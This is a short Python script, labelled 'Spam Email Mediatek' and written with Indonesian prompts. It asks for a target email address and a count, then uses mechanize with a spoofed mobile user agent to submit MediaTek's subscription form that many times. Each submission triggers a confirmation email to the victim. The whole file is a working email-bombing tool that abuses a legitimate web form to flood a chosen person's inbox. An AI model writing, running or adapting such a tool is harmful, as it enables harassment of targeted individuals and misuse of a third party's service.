try:
	import mechanize,os,sys,time,json
except ModuleNotFoundError as mdl:
	exit('Module Err: %s'%(mdl))

br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.addheaders = [("User-Agent","Mozilla/5.0 (Linux; U; Android 7.1)")]

class Mediatek:
	def __init__(self):
		self.nama1='otong'
		self.nama2='surotong'
		self.detekos()

	def banner(self):
		print("""
		;;;;;;;;;;;;;;;;;;;;;;;
		; Spam Email Mediatek ;
		;   By: Kang-Newbie   ;
		;;;;;;;;;;;;;;;;;;;;;;;
		""")
		self.email=input('[?] Email Target: ')
		jum=int(input('[?] Jumlah: '))
		print()
		for i in range(jum):
			self.send()

	def send(self):
		br.open('https://www.mediatek.com')
		br.select_form(nr=1)
		br.form['fldfirstname']=self.nama1
		br.form['fldlastname']=self.nama2
		br.form['fldEmail']=self.email
		sub=br.submit().read()
		if "Activate Your Subscription!" in str(sub):
			print('[+] Sukses mengirim OTP')
		else: print('[-] Gagal mengirim OTP')

	def detekos(self):
		if os.name in ['nt','win32']:
			os.system('cls')
		else: os.system('clear')
		self.banner()

try:
	Mediatek()
except KeyboardInterrupt:
        exit('[Exit] Key interrupt')
except Exception as F:
        print('Err: %s'%(F))